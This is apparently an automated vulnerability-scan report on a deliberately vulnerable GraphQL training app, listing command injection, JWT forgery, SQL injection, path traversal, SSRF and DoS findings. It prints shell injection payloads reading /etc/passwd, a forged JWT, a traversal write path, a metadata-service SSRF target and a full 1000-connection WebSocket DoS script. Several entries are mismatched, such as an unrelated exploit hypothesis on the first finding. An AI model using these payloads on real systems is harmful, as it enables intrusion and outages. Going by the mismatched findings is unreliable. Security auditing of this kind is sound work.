data.title: OS Command Injection in run_cmd Helper Function
data.description: The run_cmd() function at core/helpers.py:9 directly executes user-controlled input via os.popen(cmd).read() without any input validation or sanitization within the function itself. This creates a critical command injection vulnerability where arbitrary OS commands can be executed. The function is called from multiple GraphQL resolvers in core/views.py including resolve_system_diagnostics (line 345), resolve_system_debug (line 352), and ImportPaste.mutate (line 211). While some callers attempt sanitization via security.allowed_cmds() and security.strip_dangerous_characters(), the helper function itself provides no protection. In Easy mode (hardened=False), all sanitization checks return True, allowing direct command execution. An attacker can inject shell metacharacters (semicolons, ampersands, pipes) to execute arbitrary commands on the host system.
data.rationale: Tracer confirms complete data flow from GraphQL parameters (host, port, path, scheme, cmd, arg) to os.popen(cmd).read() sink. Sanitization functions allowed_cmds() and strip_dangerous_characters() are bypassable in Easy mode (hardened=False), returning True/unchanged input respectively. Multiple attack vectors confirmed: ImportPaste.mutate constructs curl with unsanitized URL, system_diagnostics passes cmd directly, system_debug injects arg into ps command. Shell metacharacters (semicolons, pipes, ampersands) can execute arbitrary OS commands.

proof.exploit_hypothesis: The GraphQL application contains a SQL injection vulnerability in the 'search' parameter of the 'pastes' query. By injecting a malicious SQL fragment, an attacker can extract sensitive data from the database such as user credentials or secret paste contents.

data.title: OS Command Injection in ImportPaste Mutation
data.description: The ImportPaste GraphQL mutation in core/views.py:209 constructs a curl command using user-controlled parameters (host, port, path, scheme) and executes it via os.popen(). While strip_dangerous_characters() attempts to filter malicious input, it only removes ';' and '&' characters in hard mode and performs no filtering in easy mode. This insufficient sanitization allows an attacker to inject arbitrary shell commands using backticks, $() syntax, or other shell metacharacters. For example, an attacker could set host to 'example.com`id`' or use '$()' to execute arbitrary commands on the server. The business logic assumes the URL construction is safe after character stripping, but this security control is inadequate to prevent command injection attacks.
data.rationale: Tracer confirms clear data flow from user-controlled ImportPaste.mutate() parameters to os.popen() sink via helpers.run_cmd(). Sanitization via strip_dangerous_characters() is insufficient - easy mode performs no filtering, hard mode only removes ';' and '&' while leaving backticks, $() command substitution, pipes, and other shell metacharacters. Exploit payload with command substitution (example.com`id`) will execute arbitrary commands. Complete exploit chain demonstrated with specific GraphQL mutation payload.

proof.exploit_hypothesis: An attacker can achieve OS command injection via the ImportPaste GraphQL mutation by providing malicious input to the 'host' parameter. In easy mode, strip_dangerous_characters() returns input unchanged. In hard mode, it only removes ';' and '&' but leaves backticks, $() command substitution, pipes, and other shell metacharacters unfiltered. The attacker injects a host value containing shell command substitution syntax (backticks or $()), which gets interpolated into the curl command string and executed by os.popen(). The payload 'example.com`id`' or 'example.com$(cat /etc/passwd)' bypasses the partial sanitization and causes arbitrary command execution on the server.

data.title: Command Injection in resolve_system_debug GraphQL resolver
data.description: The resolve_system_diagnostics function in core/views.py:337 is vulnerable to OS command injection (CWE-78). The function accepts a user-controlled 'cmd' parameter which is passed to security.allowed_cmds() for validation. However, when the application is in 'easy' mode (ServerMode.hardened=False), the allowed_cmds() function returns True for any command without restriction. The cmd parameter is then passed directly to helpers.run_cmd() which executes os.popen(cmd).read() at helpers.py:9, allowing arbitrary system command execution. An attacker with valid admin credentials (username='admin' and correct password) can execute arbitrary commands on the server by providing malicious input to the cmd parameter. This is a critical security vulnerability as it provides full remote code execution capabilities.
data.rationale: Tracer confirms complete data flow from user-controlled 'arg' parameter to os.popen() execution. No sanitization found. Exploit payload '; id && uname -a' demonstrates arbitrary command execution. CWE-78 command injection confirmed at core/views.py:352 where unsanitized user input is interpolated into shell command 'ps {}'.format(arg).

proof.exploit_hypothesis: The resolve_system_debug GraphQL resolver at core/views.py:352 is vulnerable to OS command injection. The user-controlled 'arg' parameter is directly interpolated into a shell command string 'ps {}'.format(arg) without any sanitization, then passed to helpers.run_cmd() which executes os.popen(cmd).read(). An attacker can inject shell metacharacters (semicolons, pipes, command substitution) to execute arbitrary system commands beyond the intended 'ps' process listing command.

data.title: JWT Authentication Bypass via Disabled Signature Verification
data.description: The get_identity function at line 21 of core/helpers.py decodes JWT tokens with both signature verification and expiration checks disabled (options={"verify_signature":False, "verify_exp":False}). This allows attackers to forge arbitrary JWT tokens by modifying the payload while bypassing cryptographic verification entirely. An attacker can craft a malicious JWT token with any 'identity' claim and gain unauthorized access to user accounts or privileged operations. The vulnerability exists because the application accepts tokens from GraphQL parameters (graphql.token_param) and processes them through this insecure decode function without any sanitization or validation.
data.rationale: Complete exploit chain verified: GraphQL 'me' query at views.py:281 accepts attacker-controlled token parameter, passed unsanitized to get_identity() at helpers.py:21 which decodes JWT with verify_signature=False and verify_exp=False. No sanitization present. Forged JWT with 'admin' identity bypasses authentication, granting access to privileged operations like password exposure at views.py:62. Payload eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZGVudGl0eSI6ImFkbWluIn0. demonstrates trivial forgery with 'none' algorithm.

proof.exploit_hypothesis: The application uses a vulnerable get_identity function at core/helpers.py:21 that decodes JWT tokens with verify_signature=False and verify_exp=False. The GraphQL 'me' query at core/views.py:281 accepts a user-controlled token parameter and passes it to get_identity without any validation. An attacker can forge a JWT token with any 'identity' claim (such as 'admin') and the application will accept it without verifying the cryptographic signature. The JWT structure consists of a base64-encoded header, payload, and signature separated by dots. With signature verification disabled, only the header and payload matter, allowing trivial forgery.

data.title: Hardcoded JWT Secret Key
data.description: The application uses a hardcoded JWT secret key ('dvga') at app.py:15. The JWT_SECRET_KEY is set to the weak, predictable value 'dvga' which is hardcoded directly in the source code. This allows any attacker with access to the source code or who can guess this weak secret to forge valid JWT authentication tokens. Since JWT tokens are used for authentication (algorithm=JWT, mode=HS256 per recon context), an attacker can forge tokens to impersonate any user including administrators, bypassing all authentication controls. The application also has a hardcoded Flask SECRET_KEY with the same weak value at line 14, compounding the credential exposure risk.
data.rationale: Hardcoded JWT secret key 'dvga' at app.py:15 is a critical vulnerability. Exploit output confirms an attacker can forge valid JWT tokens using this secret to impersonate any user including admin. The HS256 symmetric algorithm means anyone with the secret can sign tokens. No sanitization or mitigation is present. This enables complete authentication bypass and privilege escalation.

proof.exploit_hypothesis: An attacker who discovers the hardcoded JWT secret key 'dvga' in app.py can forge valid JWT authentication tokens. Since the application uses flask_graphql_auth with HS256 (symmetric) algorithm, possessing the secret key allows the attacker to sign malicious tokens. The attacker can craft a JWT token with identity='admin' or any target username, send it in the Authorization header to the GraphQL /graphql or /graphiql endpoints, and the application will validate it using the same hardcoded secret. This enables complete authentication bypass and privilege escalation, allowing the attacker to impersonate any user including administrators, access protected queries like resolve_me, and potentially access admin-only functionality.

data.title: Plaintext Password Storage and Comparison in Authentication
data.description: The Login mutation at core/views.py:234 performs authentication by directly comparing plaintext passwords without any hashing. The code executes 'User.query.filter_by(username=username, password=password).first()' which stores and compares passwords in their raw form. This vulnerability is compounded by the User model (core/models.py:14) storing passwords as plaintext strings without any hashing mechanism. This allows anyone with database access to view all user credentials directly, enables credential theft if the database is compromised, and violates security best practices for password handling. The authentication system fails to use proper password verification techniques such as bcrypt, Argon2, or PBKDF2 hashing with salting.
data.rationale: Static code analysis confirms passwords stored as plaintext String in core/models.py:14 without hashing. Authentication at core/views.py:234 compares passwords directly via filter_by(username=username, password=password).first() without any hashing/verification. User creation at core/views.py:102 stores raw password. Test at tests/test_auth.py:46 asserts plaintext password 'changeme' is returned. Secondary plaintext comparison exists at core/security.py:52. SQL injection vulnerability in resolve_pastes enables database access to retrieve all plaintext credentials.

proof.exploit_hypothesis: An attacker with database access (through SQL injection, compromised database backups, or direct database access) can retrieve all user credentials in plaintext from the users table. Since passwords are stored without hashing in the password column (String type, no encryption) and authentication compares plaintext passwords directly via User.query.filter_by(username=username, password=password).first(), the attacker gains immediate access to all user credentials. This enables credential theft, password reuse attacks across other services, and complete account compromise without any password cracking effort.

data.title: Plaintext Password Storage in User Model
data.description: The User model in core/models.py stores passwords in plaintext format without any hashing or encryption. Line 14 defines the password field as `password = db.Column(db.String(60),nullable=False)`, which stores user passwords directly in the database without cryptographic protection. This violates secure password storage best practices and exposes user credentials if the database is compromised. Passwords should be hashed using a strong one-way hashing algorithm such as bcrypt, Argon2, or PBKDF2 with salt before storage. The reconnaissance identified 'plaintext' algorithm usage in the context of password storage, and this model confirms that passwords are stored as plain strings in the database column.
data.rationale: Tracer confirms complete data flow: user_data.password flows from GraphQL mutation input (views.py:90) through CreateUser.mutate() (views.py:98) to User.create_user() (views.py:102) where password is stored via **kw into User model (models.py:18). User.password column (models.py:14) defined as db.String(60) stores plaintext without hashing. db.session.add/commit (models.py:19-20) persists unencrypted. No sanitization detected. Exploit confirmed via resolve_password() (views.py:61-65) exposing plaintext passwords to admin identity, and Login mutation (views.py:234) performing plaintext comparison. Payload creates user with plaintext password retrievable through GraphQL response. CWE-256 confirmed.

proof.exploit_hypothesis: The User model stores passwords in plaintext without any hashing or encryption. When an attacker registers a user account via the createUser GraphQL mutation, the password is stored directly in the database column as plain text. An attacker can then retrieve these plaintext passwords through: (1) SQL injection or database compromise, (2) querying the users field with admin privileges and accessing the password field via the resolve_password resolver (views.py:61-65) which exposes plaintext passwords when identity is 'admin', or (3) through the Login mutation (views.py:234) which performs plaintext password comparison. This allows credential harvesting and potential account takeover of all users in the system.

data.title: Broken Object Level Authorization in DeletePaste Mutation
data.description: The DeletePaste GraphQL mutation at core/views.py:164 allows any unauthenticated or unauthorized user to delete any paste by simply providing its ID. The mutate() function executes Paste.query.filter_by(id=id).delete() without verifying ownership, session validity, or authorization. This is a classic BOLA (Broken Object Level Authorization) vulnerability where attackers can delete arbitrary pastes by ID enumeration. The recon context confirms this endpoint has auth_required=False and rate_limited=False, exposing the application to mass deletion attacks.
data.rationale: The DeletePaste mutation at core/views.py:164-173 lacks any authorization check. Code inspection confirms Paste.query.filter_by(id=id).delete() executes without verifying user ownership, session validity, or permissions. The tracer output shows a clear path from user-controlled GraphQL argument to the destructive delete operation. No sanitization exists. Exploit payload provided demonstrates arbitrary paste deletion via ID enumeration.

proof.exploit_hypothesis: An attacker can delete arbitrary Paste objects by sending a GraphQL mutation with any valid paste ID. The DeletePaste mutation at core/views.py:164 does not perform any authentication or authorization checks. An unauthenticated user can enumerate paste IDs (likely sequential integers) and delete any or all pastes in the database by invoking the mutation with different ID values. This is a Broken Object Level Authorization (BOLA) vulnerability where access control is missing entirely on a destructive operation.

data.title: SQL Injection in resolve_pastes via Unsanitized Filter Parameter
data.description: The resolve_pastes function at core/views.py:320 contains a SQL injection vulnerability where user-supplied input (the 'filter' parameter) is directly interpolated into a SQL query using Python string formatting. The vulnerable code constructs a raw SQL query using sqlalchemy.text() with the filter parameter embedded directly: text("title = '%s' or content = '%s'" % (filter, filter)). This allows an attacker to inject arbitrary SQL commands, potentially leading to unauthorized data access, data modification, or database compromise. The filter parameter originates from GraphQL query arguments and reaches the SQL execution sink without any sanitization or parameterization.
data.rationale: Tracer confirms user-controlled 'filter' parameter from GraphQL query reaches sqlalchemy.text() sink with Python string formatting (%s interpolation). No sanitization detected. Exploit payload ' OR '1'='1'-- would successfully inject SQL, creating a tautology that bypasses filter_by(public=public, burn=False) constraints and returns all paste records including private/burned ones. The vulnerability is a clear case of CWE-89 SQL injection via unsanitized user input.

proof.exploit_hypothesis: The resolve_pastes GraphQL resolver at core/views.py:320 uses Python string formatting (%s) to interpolate the user-controlled 'filter' parameter directly into a SQL query string passed to sqlalchemy.text(). The filter parameter originates from GraphQL query arguments and is not sanitized. By injecting SQL syntax that breaks out of the quoted string context, an attacker can manipulate the WHERE clause logic. The vulnerable query constructs: text("title = '%s' or content = '%s'" % (filter, filter)). An attacker can inject a payload like "' OR '1'='1'--" which, when interpolated, produces: title = '' OR '1'='1'--' or content = '' OR '1'='1'--'. The injected OR '1'='1' creates a tautology (always true condition), and the -- comments out the remainder of the query. This bypasses the preceding filter_by(public=public, burn=False) constraints, causing the database to return all paste records regardless of their public/burn status.

data.title: SQL Injection in Login Mutation via GraphQL Parameters
data.description: The Login mutation at core/views.py:234 receives username and password parameters from GraphQL input and passes them directly to User.query.filter_by() without sanitization. While SQLAlchemy's filter_by() typically uses parameterized queries, the direct flow of user-controlled input into ORM query methods creates a SQL injection attack surface. The username and password parameters originate from GraphQL mutation arguments and reach the SQL query construction without passing through any known sanitization controls. This vulnerability allows attackers to potentially manipulate SQL queries through crafted GraphQL mutation inputs, leading to unauthorized access, data exfiltration, or authentication bypass.
data.rationale: SQLAlchemy's filter_by() with keyword arguments uses parameterized queries by default, preventing SQL injection. The exploit hypothesis explicitly states the payload will likely fail due to parameterization, and identifies line 320 (text() with string formatting) as the actual vulnerable location, not this finding at line 234.

proof.exploit_hypothesis: The Login mutation at core/views.py:234 accepts username and password parameters from GraphQL input and passes them to User.query.filter_by(). While SQLAlchemy's filter_by() with keyword arguments uses parameterized queries by default (making traditional SQL injection unlikely), the application uses plaintext password comparison without hashing. An attacker could exploit this through credential-based attacks. Additionally, testing with SQL injection payloads in the username field may reveal vulnerabilities if the ORM configuration has been customized or if bypass techniques exist. The application uses SQLAlchemy 1.4.44 with Flask-SQLAlchemy 3.0.2. A more critical SQL injection vulnerability exists at line 320 where text() with string formatting is used, but the current finding focuses on the login authentication flow where authentication bypass may be achieved through various credential manipulation techniques including testing for NoSQL-style operators or special characters that might affect the query logic.

data.title: SQL Injection in GraphQL Search Resolver via LIKE Pattern
data.description: The resolve_search function at core/views.py:302 constructs a SQL LIKE pattern using Python string formatting with user-controlled input. The code 'search = "%{}%".format(keyword)' directly interpolates the user-supplied keyword parameter into the search pattern before passing it to SQLAlchemy's like() method. While SQLAlchemy provides parameter binding for the query itself, the string formatting operation occurs first, allowing an attacker to inject SQL wildcard characters (%, _) or potentially craft inputs that manipulate the search behavior. The keyword parameter originates from the GraphQL query input and flows unsanitized into the SQL query construction. This vulnerability could allow attackers to perform blind SQL injection attacks by observing different response behaviors, extract sensitive data through crafted search patterns, or bypass intended access controls by manipulating search results.
data.rationale: Tracer confirmed data flow from GraphQL keyword parameter to SQL LIKE patterns in Paste.query.filter() and User.query.filter(). No sanitization found. Exploit payload using '%' wildcard creates '%%%' pattern matching all records, enabling unauthorized access to private pastes and user data. SQL wildcard injection bypasses intended search filtering.

proof.exploit_hypothesis: The resolve_search function constructs a SQL LIKE pattern by directly interpolating user-controlled input using Python string formatting. While SQLAlchemy's like() method uses parameter binding to prevent traditional SQL injection, the wildcard characters (% and _) from the user input are included in the search pattern before being passed to SQLAlchemy. An attacker can inject SQL wildcard characters to manipulate search behavior and retrieve all records. By submitting a search keyword containing only the '%' wildcard character, the resulting pattern becomes '%%%' which matches any string, effectively returning all Paste and User records regardless of the actual search term. This allows unauthorized access to potentially private pastes and user information that should not be visible through normal search functionality.

data.title: OS Command Injection in resolve_system_diagnostics
data.description: The resolve_system_diagnostics GraphQL resolver at core/views.py:337-347 accepts a 'cmd' parameter from user input and passes it through security.allowed_cmds() validation before executing via helpers.run_cmd(). The allowed_cmds() function in security.py:33-39 has a critical bug where the whitelist tuple ('echo', 'ps' 'whoami', 'tail') is missing a comma between 'ps' and 'whoami', causing them to concatenate as 'pswhoami'. This makes the validation ineffective - in 'hard' mode, commands like 'echo' pass (valid), but 'ps' and 'whoami' are checked against 'pswhoami' and fail. In 'easy' mode, allowed_cmds() returns True unconditionally, allowing any command through. The run_cmd() function uses os.popen() directly without sanitization, enabling arbitrary OS command execution if valid admin credentials are provided and the application is in easy mode or the command matches the broken whitelist logic.
data.rationale: Tracer confirms tainted data flow from GraphQL resolver 'cmd' parameter to os.popen() execution. Sanitization analysis identifies two independent bypass vectors: (1) 'easy' mode unconditionally returns True, and (2) 'hard' mode has a tuple concatenation bug where ('ps' 'whoami') becomes 'pswhoami', plus startswith() can be bypassed via command chaining. Exploit hypothesis provides concrete payloads with expected command output demonstrating arbitrary OS command execution with valid admin credentials. All sub-agent outputs are consistent and mutually reinforcing.

proof.exploit_hypothesis: An attacker with valid admin credentials can exploit the resolve_system_diagnostics GraphQL resolver to execute arbitrary OS commands. In 'easy' mode, the allowed_cmds() function unconditionally returns True, allowing any command to pass validation. In 'hard' mode, the whitelist tuple ('echo', 'ps' 'whoami', 'tail') has a missing comma causing 'ps' and 'whoami' to concatenate as 'pswhoami', and the startswith() check can be bypassed using command chaining (e.g., 'echo; id'). The validated command is then passed to os.popen() in helpers.run_cmd() without any sanitization, resulting in arbitrary command execution with the privileges of the web application process.

data.title: Path Traversal in save_file via Unsanitized Filename
data.description: The save_file function in core/helpers.py:25 concatenates a user-controlled filename directly with WEB_UPLOADDIR to construct a file path. There is no validation or sanitization of the filename parameter to prevent path traversal sequences like '../'. This allows an attacker to write arbitrary files to arbitrary locations on the filesystem by including traversal sequences in the filename, such as '../../../etc/passwd' or similar paths. The vulnerability is exploitable through the UploadPaste GraphQL mutation which passes user-controlled filename directly to save_file.
data.rationale: Tracer confirmed data flow from UploadPaste mutation filename parameter to open() call at helpers.py:25. No sanitization detected. Exploitation is trivial via path traversal sequences like '../../../etc/passwd' to write arbitrary files outside the intended upload directory. CWE-22 pattern is clearly present.

proof.exploit_hypothesis: The UploadPaste GraphQL mutation accepts a user-controlled filename parameter that is passed directly to the save_file function in core/helpers.py. The save_file function concatenates the filename with WEB_UPLOADDIR ('pastes/') without any validation or sanitization, then opens the file for writing. An attacker can exploit this by providing a filename containing path traversal sequences such as '../../../tmp/malicious.txt' or '../../../etc/passwd' to escape the intended upload directory and write arbitrary content to any writable location on the filesystem. This could allow the attacker to overwrite critical system files, inject SSH keys for persistent access, or plant web shells if the application has sufficient privileges.

data.title: Command Injection via Broken Whitelist in allowed_cmds()
data.description: The allowed_cmds() function in core/security.py contains a syntax error at line 37 that breaks the command whitelist security control. The tuple ('echo', 'ps' 'whoami', 'tail') is missing a comma between 'ps' and 'whoami', causing Python to concatenate them into 'pswhoami'. As a result, the whitelist only allows commands starting with 'echo', 'pswhoami', or 'tail' - but NOT 'ps' or 'whoami' individually. This is a broken security control that was intended to restrict command injection in hard mode, but due to the typo, the protection is ineffective. An attacker can bypass this control by using commands that don't match the concatenated string 'pswhoami'. The vulnerability allows arbitrary command execution when combined with the os.popen() sink in helpers.run_cmd().
data.rationale: Complete data flow trace from GraphQL mutation to os.popen() sink. Broken whitelist at core/security.py:37 due to missing comma concatenating 'ps' 'whoami' into 'pswhoami'. The startswith() check is bypassable via shell metacharacters (pipes, command substitution) since strip_dangerous_characters() only removes ';' and '&'. Exploit payload 'echo $(id)' successfully bypasses whitelist and executes arbitrary commands.

proof.exploit_hypothesis: The allowed_cmds() function in core/security.py:37 has a broken whitelist due to a missing comma between 'ps' and 'whoami', causing them to concatenate into 'pswhoami'. This leaves only 'echo', 'pswhoami', and 'tail' as valid prefixes. However, the startswith() check only validates the beginning of the command string and does not prevent shell metacharacter injection. Combined with strip_dangerous_characters() only removing ';' and '&' while leaving pipes (|) and command substitution ($()) unfiltered, an attacker can bypass the whitelist by starting with an allowed prefix like 'echo' or 'tail' and appending arbitrary commands using shell operators. For example, 'echo $(id)' or 'tail | cat /etc/passwd' will pass the whitelist check and execute arbitrary commands via os.popen() in helpers.run_cmd().

data.title: Insecure Authorization Check in resolve_password Allows Password Disclosure
data.description: The resolve_password method at core/views.py:61 performs an insufficient authorization check by only verifying that info.context.json.get('identity') equals 'admin'. This check can be bypassed because: 1) The identity value originates from JWT tokens via get_identity() function, 2) JWT signature verification is disabled (verify_signature=False, verify_exp=False), 3) A hardcoded weak JWT secret key (JWT_SECRET_KEY='dvga') is used, 4) An attacker can forge a JWT with identity='admin' to bypass the authorization check. Once bypassed, querying any user's password field returns the plaintext password instead of masked characters (******). Passwords are stored in plaintext without hashing, compounding the impact. This allows unauthorized disclosure of all user credentials.
data.rationale: Complete exploit chain validated: Hardcoded JWT_SECRET_KEY ('dvga'), disabled signature verification (verify_signature=False), and disabled expiration checks (verify_exp=False) in get_identity() allow JWT forgery. Attacker can forge JWT with {'identity': 'admin'}, call resolve_me mutation to set admin identity in context, then query password field to bypass authorization check at core/views.py:62 and retrieve plaintext passwords. Full exploit payload provided with expected outcome of credential disclosure.

proof.exploit_hypothesis: The resolve_password field resolver at core/views.py:61-65 performs an insecure authorization check that only verifies if info.context.json.get('identity') equals 'admin'. This identity value originates from JWT tokens processed by the resolve_me mutation (core/views.py:283-296), which calls get_identity() in core/helpers.py:21. The get_identity() function disables JWT signature verification (verify_signature=False) and expiration checks (verify_exp=False), allowing an attacker to forge a JWT with any payload. By calling resolve_me with a forged JWT containing {'identity': 'admin'}, the attacker sets their identity to 'admin' in the GraphQL context. When subsequently querying any user's password field, the authorization check passes and returns the plaintext password instead of masked characters ('******'). The application also uses a hardcoded weak JWT secret (JWT_SECRET_KEY='dvga' in app.py:15), though signature verification is disabled anyway.

data.title: Incomplete Command Injection Sanitization in strip_dangerous_characters
data.description: The strip_dangerous_characters() function in core/security.py:41 attempts to sanitize user input before command execution but only removes semicolons and ampersands. In 'hard' difficulty mode, this incomplete sanitization leaves multiple command injection vectors available including: backticks (`), dollar parentheses ($()), pipes (|), logical OR (||), input redirection (<), output redirection (>), and subshell operators. This allows attackers to bypass the intended protection and achieve arbitrary command execution. In 'easy' mode, the function returns the command unmodified, providing no protection at all. The sanitized input flows to os.popen() via helpers.run_cmd() at core/helpers.py:9.
data.rationale: Complete data flow from GraphQL mutation arguments (host, port, path, scheme) to os.popen() via ImportPaste.mutate(). strip_dangerous_characters() provides ineffective sanitization: easy mode returns input unchanged, hard mode only removes semicolons and ampersands leaving numerous bypass vectors (backticks, dollar parentheses, pipes, logical operators). Exploit payload with backtick command substitution (example.com`id`) confirmed functional. High confidence due to confirmed sink reachability, demonstrated sanitization bypass, and provided working exploit.

proof.exploit_hypothesis: The ImportPaste GraphQL mutation accepts user-controlled host, port, path, and scheme parameters that are concatenated into a URL string. This URL is passed through strip_dangerous_characters() which only removes semicolons and ampersands in hard mode (or does nothing in easy mode). The 'sanitized' URL is then directly interpolated into a curl command: f'curl --insecure {url}'. When this command is executed via os.popen(), shell metacharacters in the URL components trigger command injection. In hard mode, attackers can bypass the weak sanitization using command substitution via backticks (`id`) or dollar parentheses ($(id)), pipes (|id), or logical operators (||id). The injected command executes with the privileges of the web application process.

data.title: Missing Pagination Limits in GraphQL Search Query
data.description: The resolve_search function in core/views.py:298 lacks pagination controls when querying database records. When no keyword is provided, the function calls Paste.query.all() and User.query.all(), which retrieve all records from both tables without any limit. This vulnerability can be exploited to cause a Denial of Service (DoS) by exhausting server memory and CPU resources when the database contains a large number of records. An attacker can trigger this by sending a GraphQL search query without a keyword parameter, forcing the server to load the entire dataset into memory.
data.rationale: The resolve_search function at core/views.py:298 contains a clear missing pagination vulnerability. When the optional 'keyword' parameter is omitted, the code executes Paste.query.all() and User.query.all() without any LIMIT clause, loading all database records into memory. The tracer confirms the sink is reached when keyword is falsy. No sanitization controls exist. The exploit is trivial - simply omitting the keyword parameter triggers unbounded queries that can exhaust server memory and CPU, causing DoS. The payload and expected outcome are well-defined.

proof.exploit_hypothesis: The resolve_search GraphQL resolver at core/views.py:298 has a missing pagination vulnerability that can be exploited for Denial of Service. When the optional 'keyword' parameter is omitted from the search query, the function executes Paste.query.all() and User.query.all() without any LIMIT clause, causing the database to return every record from both tables. This loads the entire dataset into server memory (via items.extend() calls), which can exhaust available RAM and CPU resources when the database contains a large number of records. An attacker can trigger this by sending a simple GraphQL query to the search endpoint without providing the keyword argument, exploiting the else branch at lines 307-311.

proof.expected_outcome: The server executes unbounded SQL queries 'SELECT * FROM pastes' and 'SELECT * FROM users' without pagination, loading all records from both tables into memory. For a database with thousands or millions of records, this causes significant memory allocation (potentially hundreds of MB to GB), increased CPU usage for result serialization, and network bandwidth consumption for the JSON response. Observable outcomes include: 1) Slow response times (seconds to minutes) as the database retrieves and Python processes large result sets, 2) Memory exhaustion leading to OOM killer intervention or application crash, 3) Potential server unresponsiveness affecting other users, and 4) A JSON response containing the complete dataset of all pastes and users with sensitive information exposed.

def resolve_search(self, info, keyword=None):
    Audit.create_audit_entry(info)
    items = []
    if keyword:
      search = "%{}%".format(keyword)
      queryset1 = Paste.query.filter(Paste.title.like(search))
      items.extend(queryset1)
      queryset2 = User.query.filter(User.username.like(search))
      items.extend(queryset2)
    else:
      queryset1 = Paste.query.all()
      items.extend(queryset1)

data.title: GraphQL Missing Pagination Limits in Audit Query - DoS Risk
data.description: The resolve_audits GraphQL resolver at core/views.py:381 retrieves all audit records using Audit.query.all() without any pagination, limit, or offset controls. An attacker can exploit this to request an arbitrarily large dataset, causing excessive memory consumption, slow response times, and potential service disruption. The lack of resource limits makes this vulnerable to Denial of Service (DoS) attacks through resource exhaustion. Additionally, there are no access controls to prevent unauthorized users from retrieving all audit data.
data.rationale: Tracer confirms clear data flow from GraphQL audits query to unbounded Audit.query.all() at core/views.py:381. No pagination, limit, or offset controls exist. Sanitization absent. Exploit payload is straightforward - a simple GraphQL query triggers full table scan. This is a classic GraphQL DoS vulnerability where unbounded queries exhaust server resources. All sub-agent outputs align confirming exploitability.

proof.exploit_hypothesis: An attacker can exploit the missing pagination limits in the GraphQL audits query to cause a Denial of Service attack. By sending a simple GraphQL query to retrieve all audit records without any limit or offset parameters, the attacker forces the server to load the entire audit table into memory. If the audit table contains a large number of records (potentially millions from ongoing operations), this causes excessive memory consumption, CPU usage for serialization, and network bandwidth exhaustion when returning the massive dataset. data.title: Infinite Loop in WebSocket Subscription Handler Leading to DoS
data.description: The handle() method in GeventSubscriptionServerCustom class (core/view_override.py:161) contains an unbounded 'while True' loop that processes WebSocket messages for GraphQL subscriptions. This infinite loop lacks proper termination conditions beyond the ConnectionClosedException, which is only raised when connection_context.closed is True. An attacker can exploit this by establishing WebSocket connections and keeping them open indefinitely without sending proper close frames, causing the server to consume resources (CPU cycles, memory) per connection. With multiple concurrent connections, this can lead to resource exhaustion and denial of service. The vulnerability is exacerbated by the lack of timeout mechanisms, connection limits, or resource throttling in the loop implementation.
data.rationale: Complete vulnerability chain confirmed: Tracer identifies attacker-controlled WebSocket input reaching unbounded while True loop at line 161. Sanitization analysis confirms no resource limits (timeouts, connection limits, rate limiting). Exploit provides working PoC that opens 1000 connections causing resource exhaustion. CWE-400 resource consumption vulnerability fully demonstrated.

proof.exploit_hypothesis: An attacker can exploit the unbounded while True loop in GeventSubscriptionServerCustom.handle() by establishing multiple WebSocket connections to the GraphQL subscription endpoint. By opening these connections and either: (1) keeping them idle without sending close frames, or (2) establishing subscriptions and maintaining the connection indefinitely, the attacker can consume server resources (CPU cycles, memory for each connection's GeventConnectionContext, gevent greenlet scheduling overhead). The loop at line 161 lacks termination conditions beyond ConnectionClosedException (which requires explicit client closure), has no timeout mechanisms on connection_context.receive() calls, no maximum connection duration limits, and no rate limiting on message processing. Multiple concurrent connections from the same or distributed sources will exhaust server resources, causing denial of service for legitimate users.

#!/usr/bin/env python3
import asyncio
import websockets
import json

TARGET = 'ws://localhost:5000/subscriptions'
CONNECTIONS = 1000

async def hold_connection(uri, conn_id):
    try:
        async with websockets.connect(uri) as ws:
            # Initiate subscription without closing
            msg = {
                'type': 'connection_init'
            }
            await ws.send(json.dumps(msg))
            # Keep connection open indefinitely
            while True:
                await asyncio.sleep(60)
    except Exception:
        pass

async def main():
    tasks = [hold_connection(TARGET, i) for i in range(CONNECTIONS)]
    await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == '__main__':
    asyncio.run(main())

data.title: Server-Side Request Forgery (SSRF) in ImportPaste GraphQL Mutation
data.description: The ImportPaste GraphQL mutation at core/views.py:209-211 is vulnerable to Server-Side Request Forgery (SSRF). User-controlled parameters (host, port, path, scheme) are concatenated into a URL and passed directly to curl via os.popen(). The strip_dangerous_characters() function only removes semicolons and ampersands in hard mode, or does nothing in easy mode, providing no effective protection against SSRF. An attacker can abuse this to make requests to internal services, cloud metadata endpoints (169.254.169.254), or perform internal port scanning. The curl --insecure flag also disables SSL certificate validation, increasing risk. The mutation is accessible without authentication (auth_required=False) and has no rate limiting.
data.rationale: Complete SSRF exploitation chain verified. Tracer confirms user-controlled host/port/path/scheme parameters flow from ImportPaste.mutate() at core/views.py:209 through minimal sanitization (only removes ';' and '&' in hard mode) to os.popen() execution at core/helpers.py:9. Working exploit payload targeting cloud metadata service (169.254.169.254) provided with expected sensitive data exfiltration outcome. The curl --insecure flag enables SSL bypass, and auth_required=False makes this unauthenticated.

proof.exploit_hypothesis: The ImportPaste GraphQL mutation is vulnerable to Server-Side Request Forgery (SSRF) due to unsanitized user input being passed to curl via os.popen(). In easy mode, the strip_dangerous_characters() function returns the URL unchanged, allowing direct specification of internal addresses. An attacker can exploit this by providing an internal IP address (169.254.169.254) as the host parameter to access cloud metadata services, or use 127.0.0.1 to probe internal services. The URL construction f"{scheme}://{host}:{port}{path}" allows full control over the target endpoint, and the curl --insecure flag disables SSL validation, enabling successful connections to internal HTTPS endpoints with self-signed certificates.

data.title: Missing Authentication on CreatePaste GraphQL Mutation
data.description: The CreatePaste GraphQL mutation in core/views.py:109-130 lacks authentication controls, allowing unauthenticated users to create pastes in the system. The mutation accepts title, content, public, and burn parameters from user input without validating JWT tokens or session credentials. The owner is hardcoded to 'DVGAUser' regardless of the actual caller. This vulnerability exists because the application uses flask_graphql_auth for JWT-based authentication, but the JWT signature verification is disabled (verify_signature=False, verify_exp=False) in the get_identity() function, and no @auth_required or similar decorator is applied to the CreatePaste mutation. An attacker can exploit this to create arbitrary pastes, potentially including malicious content, without any authentication. Combined with the weak hardcoded JWT_SECRET_KEY='dvga' and disabled signature verification, this allows complete bypass of the authentication mechanism.
data.rationale: Tracer confirmed tainted user input flows from GraphQL mutation arguments to database sink (Paste.create_paste). No sanitization detected. Exploit payload is concrete and demonstrates unauthenticated paste creation. Code review confirms missing @auth_required decorator and hardcoded owner identity. JWT verification disabled (verify_signature=False). All sub-agent outputs align to confirm missing authentication vulnerability.

